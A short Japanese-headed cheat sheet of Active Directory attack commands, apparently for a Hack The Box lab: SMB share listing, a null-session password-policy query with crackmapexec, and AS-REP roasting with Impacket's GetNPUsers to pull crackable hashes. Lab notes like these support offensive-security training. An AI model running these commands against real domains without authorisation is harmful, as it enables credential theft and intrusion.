### smbclient  

    smbclient -L <ipaddr>

### passwordポリシーの取得
    crackmapexec smb 10.129.1.77 --pass-pol -u '' -p ''

### impacket

    python3 GetNPUsers.py -dc-ip 10.129.1.77 -request 'htb.local/' -format hashcat
